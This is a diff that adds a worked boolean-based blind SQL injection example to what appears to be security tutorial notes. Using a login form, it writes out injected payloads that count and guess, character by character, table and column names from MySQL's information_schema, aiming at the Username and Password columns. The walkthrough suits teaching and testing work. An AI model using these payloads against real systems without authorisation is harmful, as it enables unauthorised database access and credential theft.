@@ -367,4 +367,43 @@ There are two types of blind SQL injections: boolean-based and time-based.
 
 Boolean-based blind SQL injection is a subtype of blind SQL injection where the attacker observes the behavior of the database server and the application after combining legitimate queries with malicious data using boolean operators.
 
+Example:
 
+A login page with two fields: username and password. We notice that if we put ```'+OR+1=1--+``` inside the username parameter (intercepter with Burp) we obtain a different response than if we pass other data. Due to the comment style we inference that the DB is a MySql DB, in addition we are facing a boolean based SQLi.
+
+Because we don't know anything of the DB, like the number of the table, the columns' names, etc we need to do some enumeration.
+
+We can understand the number of tables present in the DB with the following query:
+```sql
+username='+OR+(SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema=database())+>=+0+--+
+```
+In MySQL the **database()** function return the name of the current DB. This query must return the true response because otherwise there aren't tables inside the current DB.
+Then, we can change the number to understand the exact number of tables.
+
+In our case we have only one table. In order to enumerate the name of this one we can do something like:
+```sql
+username='+OR+SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema=database()),1,1)='u'+--+
+```
+An then:
+```sql
+username='+OR+SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema=database()),2,1)='s'+--+
+```
+
+and so on...
+
+
+Now we know that the table is called "**users**". Now we need to find the columns names inside this table. 
+
+First we want to check how many columns there are in the "users" table:
+```sql
+username='+OR+(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_schema=database()+AND+TABLE_NAME='users')>3
+```
+
+Now we know that the table contains four columns.
+
+In order to enumerate the column names we will use the following:
+```sql
+username='+OR+SUBSTRING((SELECT+COLUMN_NAME+FROM+information_schema.columns+WHERE+table_schema=database()+AND+TABLE_NAME='users'+LIMIT+1+OFFSET+2),1,1)='P'
+```
+
+By these queries we found that the interesting columns for us are '**Username**' and '**Password**'.
